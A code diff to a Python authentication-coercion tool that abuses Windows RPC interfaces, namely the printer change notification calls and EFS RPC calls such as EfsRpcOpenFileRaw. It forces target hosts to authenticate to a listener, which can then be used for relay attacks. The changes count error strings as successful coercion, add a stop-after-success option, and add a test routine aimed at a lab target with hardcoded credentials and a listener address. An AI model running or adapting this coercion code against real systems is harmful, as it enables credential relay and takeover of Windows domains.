@@ -94,7 +94,11 @@ class RpcRemoteFindFirstPrinterChangeNotificationEx(CoersionModule):
 			if err is not None:
 				raise err
 			return True, None
-		except DCERPCException as e:
+		except Exception as e:
+			exc = str(e).lower()
+			if exc.find('rpc_s_access_denied') != -1 or exc.find('server_unavailable') != -1:
+				# it worked!
+				return True, None
 			return None, e
 
 class RpcRemoteFindFirstPrinterChangeNotification(CoersionModule):
@@ -128,7 +132,11 @@ class RpcRemoteFindFirstPrinterChangeNotification(CoersionModule):
 			if err is not None:
 				raise err
 			return True, None
-		except DCERPCException as e:
+		except Exception as e:
+			exc = str(e).lower()
+			if exc.find('rpc_s_access_denied') != -1 or exc.find('server_unavailable') != -1:
+				# it worked!
+				return True, None
 			return None, e
 
 class IsPathShadowCopied(CoersionModule):
@@ -213,7 +221,11 @@ class ElfrOpenBELW(CoersionModule):
 			if err is not None:
 				raise err
 			return True, None
-		except DCERPCException as e:
+		except Exception as e:
+			exc = str(e).lower()
+			if exc.find('bad_netpath') != -1 or exc.find('path_not_found') != -1:
+				# it worked!
+				return True, None
 			return None, e
 		
 class EfsRpcRemoveUsersFromFile(CoersionModule):
@@ -243,7 +255,10 @@ class EfsRpcRemoveUsersFromFile(CoersionModule):
 			if err is not None:
 				raise err
 			return True, None
-		except DCERPCException as e:
+		except Exception as e:
+			if str(e).upper().find('ERROR_BAD_NETPATH') != -1:
+				# it worked!
+				return True, None
 			return None, e
 		
 class EfsRpcQueryUsersOnFile(CoersionModule):
@@ -273,7 +288,10 @@ class EfsRpcQueryUsersOnFile(CoersionModule):
 			if err is not None:
 				raise err
 			return True, None
-		except DCERPCException as e:
+		except Exception as e:
+			if str(e).upper().find('ERROR_BAD_NETPATH') != -1:
+				# it worked!
+				return True, None
 			return None, e
 		
 class EfsRpcQueryRecoveryAgents(CoersionModule):
@@ -303,7 +321,10 @@ class EfsRpcQueryRecoveryAgents(CoersionModule):
 			if err is not None:
 				raise err
 			return True, None
-		except DCERPCException as e:
+		except Exception as e:
+			if str(e).upper().find('ERROR_BAD_NETPATH') != -1:
+				# it worked!
+				return True, None
 			return None, e
 		
 		
@@ -334,7 +355,10 @@ class EfsRpcOpenFileRaw(CoersionModule):
 			if err is not None:
 				raise err
 			return True, None
-		except DCERPCException as e:
+		except Exception as e:
+			if str(e).upper().find('ERROR_BAD_NETPATH') != -1:
+				# it worked!
+				return True, None
 			return None, e
 		
 class EfsRpcFileKeyInfo(CoersionModule):
@@ -364,7 +388,10 @@ class EfsRpcFileKeyInfo(CoersionModule):
 			if err is not None:
 				raise err
 			return True, None
-		except DCERPCException as e:
+		except Exception as e:
+			if str(e).upper().find('ERROR_BAD_NETPATH') != -1:
+				# it worked!
+				return True, None
 			return None, e
 	
 class EfsRpcEncryptFileSrv(CoersionModule):
@@ -394,7 +421,10 @@ class EfsRpcEncryptFileSrv(CoersionModule):
 			if err is not None:
 				raise err
 			return True, None
-		except DCERPCException as e:
+		except Exception as e:
+			if str(e).upper().find('ERROR_BAD_NETPATH') != -1:
+				# it worked!
+				return True, None
 			return None, e
 		
 	
@@ -426,7 +456,10 @@ class EfsRpcDuplicateEncryptionInfoFile(CoersionModule):
 			if err is not None:
 				raise err
 			return True, None
-		except DCERPCException as e:
+		except Exception as e:
+			if str(e).upper().find('ERROR_BAD_NETPATH') != -1:
+				# it worked!
+				return True, None
 			return None, e
 
 class EfsRpcDecryptFileSrv(CoersionModule):
@@ -456,7 +489,10 @@ class EfsRpcDecryptFileSrv(CoersionModule):
 			if err is not None:
 				raise err
 			return True, None
-		except DCERPCException as e:
+		except Exception as e:
+			if str(e).upper().find('ERROR_BAD_NETPATH') != -1:
+				# it worked!
+				return True, None
 			return None, e
 
 class EfsRpcAddUsersToFileEx(CoersionModule):
@@ -486,7 +522,10 @@ class EfsRpcAddUsersToFileEx(CoersionModule):
 			if err is not None:
 				raise err
 			return True, None
-		except DCERPCException as e:
+		except Exception as e:
+			if str(e).upper().find('ERROR_BAD_NETPATH') != -1:
+				# it worked!
+				return True, None
 			return None, e
 
 
@@ -517,7 +556,10 @@ class EfsRpcAddUsersToFile(CoersionModule):
 			if err is not None:
 				raise err
 			return True, None
-		except DCERPCException as e:
+		except Exception as e:
+			if str(e).upper().find('ERROR_BAD_NETPATH') != -1:
+				# it worked!
+				return True, None
 			return None, e
 
 
@@ -590,7 +632,7 @@ async def dummy_print(msg):
 	print(msg)
 
 class Coersion():
-	def __init__(self, factory:SMBConnectionFactory, delay_ms:int = None, print_cb = dummy_print):
+	def __init__(self, factory:SMBConnectionFactory, delay_ms:int = None, print_cb = dummy_print, continue_on_success:bool = False):
 		self.factory = factory
 		self.modules = {}
 		self.include_modules = []
@@ -601,6 +643,8 @@ class Coersion():
 		self.listeners = {}
 		self.print_cb = print_cb
 		self.delay_ms = delay_ms
+		self.main_task = None
+		self.continue_on_success = continue_on_success
 
 	async def print(self, msg):
 		if self.print_cb is None:
@@ -651,9 +695,9 @@ class Coersion():
 	
 	def get_filtered_modules(self):
 		filtered_protcol = {}
-		if self.include_protocols is None or len(self.include_modules) == 0:
+		if self.include_protocols is None or len(self.include_protocols) == 0:
 			filtered_protcol = self.modules
-		else:	
+		else:
 			for protcolname in self.include_protocols:
 				if protcolname not in self.modules:
 					continue
@@ -702,16 +746,18 @@ class Coersion():
 			if rpc is not None:
 				await rpc.close()
 
-	async def run(self):
+
+	async def coersion_main(self):
 		try:
-			if len(self.modules) == 0:
-				self.load_local_modules()
-			
-			if len(self.listeners) == 0:
-				raise Exception('No listeners configured')
-			
+			relay_result = None
 			for protcolname, modules in self.get_filtered_modules().items():
+				if relay_result is True and self.continue_on_success is False:
+					break
+				
 				for module in modules:
+					if relay_result is True and self.continue_on_success is False:
+						break
+					
 					protoclass = COERSION_PROTOCOL_NAME_MAP[protcolname]
 					# Filter out the unneeded endpoints
 					endpoints = []
@@ -727,6 +773,9 @@ class Coersion():
 					endpoints_tested = {}
 
 					for endpoint, listener_config, path_template in self.get_rpc_targets(module, endpoints):
+						if relay_result is True and self.continue_on_success is False:
+							break
+
 						if self.delay_ms is not None:
 							await asyncio.sleep(self.delay_ms/1000)
 
@@ -740,16 +789,39 @@ class Coersion():
 							await self.print('   [!] Failed to connect to %s' % str(endpoint))
 							continue
 
-						async with rpc:	
-							_, err = await module.run(rpc, listener_config, path_template)
+						async with rpc:
+							path = module.get_path(listener_config, path_template)
+							await self.print('   [+] Running %s %s %s' % (str(module.__name__), str(endpoint), str(path)))
+							relay_result, err = await module.run(rpc, listener_config, path_template)
 							# we expect an exception here
+							if relay_result is True:
+								await self.print('      [+] Success!')
+								continue
+							else:
+								await self.print('      [!] %s' % err)
 							await self.print('      [?] %s' % err)
-			return True, None
+							
 		except Exception as e:
 			await self.print('[-] %s' % e)
 			return False, e
-			
 
+
+	async def run(self):
+		try:
+			if len(self.modules) == 0:
+				self.load_local_modules()
+			
+			if len(self.listeners) == 0:
+				raise Exception('No listeners configured')
+
+			if len(self.get_filtered_modules().items()) == 0:
+				raise Exception('No modules configured')
+			
+			self.main_task = asyncio.create_task(self.coersion_main())
+			return self.main_task, None
+		except Exception as e:
+			await self.print('[-] %s' % e)
+			return None, e
 
 async def test(url_str):
 	import argparse
@@ -759,7 +831,7 @@ async def test(url_str):
 	parser.add_argument('-w', '--smb-worker-count', type=int, default=100, help='Parallell count')
 	parser.add_argument('-o', '--out-file', help='Output file path.')
 	parser.add_argument('-s', '--stdin', action='store_true', help='Read targets from stdin')
-
+	parser.add_argument('--continue-on-success', action='store_true', help='Continue on success')
 	parser.add_argument('--delay', type=int, help = 'Delay between requests')
 
 	#parser.add_argument('--filter-transport-name', action='append', help = 'Filter transport')
@@ -786,18 +858,40 @@ async def test(url_str):
 	}
 	
 	factory = SMBConnectionFactory.from_url(url_str)
-	coersion = Coersion(factory, delay_ms = args.delay)
+	coersion = Coersion(factory, delay_ms = args.delay, continue_on_success = args.continue_on_success)
 	coersion.listeners = listener_configs
 	coersion.auth_types = args.auth_type
 	coersion.include_path_types = args.filter_pipe_name
 	coersion.include_protocols = args.filter_protocol_name
 	coersion.include_modules = args.filter_method_name
+	
 
 	print(args)
 
-	await coersion.run()
-	
+	coersion_task, err = await coersion.run()
+	if err is not None:
+		print('[-] %s' % err)
+		return
+	await coersion_task
+
+async def test2(url_str):
+	factory = SMBConnectionFactory.from_url(url_str)
+	coersion = Coersion(factory, delay_ms = 50)
+	#coersion.listeners = None
+	#coersion.auth_types = args.auth_type
+	#coersion.include_path_types = args.filter_pipe_name
+	#coersion.include_protocols = ['SMB', 'HTTP']
+	coersion.include_protocols = ['EFSR']
+
+	#coersion.create_default_listeners('localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA')
+	coersion.create_default_listeners('192.168.56.1')
+
+	coersion_task, err = await coersion.run()
+	if err is not None:
+		print('[-] %s' % err)
+		return
+	await coersion_task
 
 if __name__ == '__main__':
-	url = 'smb2+ntlm-password://hodor:hodor@192.168.56.22'
-	asyncio.run(test(url))
+	url = 'smb2+ntlm-password://NORTH\\hodor:hodor@192.168.56.23'
+	asyncio.run(test2(url))
